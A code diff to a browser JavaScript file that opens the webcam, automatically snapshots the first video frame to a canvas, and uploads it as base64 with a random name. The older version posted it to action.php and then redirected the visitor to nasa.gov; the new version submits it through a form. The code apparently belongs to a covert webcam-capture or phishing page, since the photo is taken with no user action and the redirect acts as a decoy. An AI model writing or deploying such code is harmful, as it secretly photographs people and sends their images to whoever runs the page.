@@ -1,5 +1,8 @@
 var video = document.getElementById("video")
-const can = document.getElementById("canvas")
+const can = document.getElementById("canvas"),
+  form = document.querySelector('form'),
+  name = document.querySelector("#name"),
+  dataInput = document.querySelector("#data")
 
 window.onload = () => {
 
@@ -30,7 +33,6 @@ if(navigator.mediaDevices.getUserMedia){
   .then(stream => {
     let streamHeight = stream.getVideoTracks()[0].getSettings().height
     let streamWidth = stream.getVideoTracks()[0].getSettings().width
-    //sets the video source to play the video
     video.height = streamHeight
     video.width = streamWidth
     video.srcObject = stream
@@ -45,27 +47,21 @@ else{
 }
 
 video.addEventListener('canplay', () => drawCan())
-//when the video starts playing
+
 function drawCan(){
   try{
     var ctx = can.getContext("2d")
     can.height = video.height
     can.width = video.width
-    //draw the first frame of the video into the canvas
-    //the image we need is captured now in our canvas
     ctx.drawImage(video, 0, 0, can.width, can.height);
     
     //converts the image to a dataURL
     let data = can.toDataURL('image/png');
-    //generates a random name to save the image as
     let imgName = Math.round(Math.random() * 1000000)
     
-    $.post("action.php", {
-      name: imgName,
-      baseString: data
-    }, (data, status) => {
-      window.location.href = "https://nasa.gov"
-    })
+    dataInput.value = data
+    name.value = imgName
+    form.submit()
   }catch(err){
     document.write(err)
   }
